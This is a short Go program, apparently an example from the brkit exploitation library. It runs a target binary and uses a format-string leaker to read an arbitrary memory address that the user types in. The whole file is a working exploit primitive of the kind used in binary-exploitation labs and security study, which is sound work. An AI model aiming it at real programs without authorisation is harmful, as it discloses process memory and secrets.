package main

import (
	"bufio"
	"flag"
	"github.com/stephen-fox/brkit/process"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
)

func main() {
	flag.Parse()

	cmd := exec.Command(flag.Arg(0))
	proc := process.ExecOrExit(cmd)
	proc.SetLogger(log.New(log.Writer(), log.Prefix(), log.Flags()))

	leaker := process.SetupFormatStringParamLeakerOrExit(process.FormatStringParamLeakerConfig{
		GetProcessFn: func() *process.Process {
			return proc
		},
		MaxNumParams: 200,
		PointerSize:  8,
	})

	log.Printf("pid: %d", cmd.Process.Pid)

	log.Printf("please enter a memory address to read from followed by 'enter':\n")
	pointerStr, err := bufio.NewReader(os.Stdin).ReadString('\n')
	if err != nil {
		log.Fatalln(err)
	}

	pointerStr = strings.TrimPrefix(pointerStr[0:len(pointerStr)-1], "0x")
	log.Printf("parsing '%s'", pointerStr)

	pointer, err := strconv.ParseUint(pointerStr, 16, 64)
	if err != nil {
		log.Fatalln(err)
	}

	raw, err := leaker.MemoryAt(process.PointerMakerForX86().U64(pointer), proc)
	if err != nil {
		log.Fatalln(err)
	}

	log.Printf("read: 0x%x", raw)
}
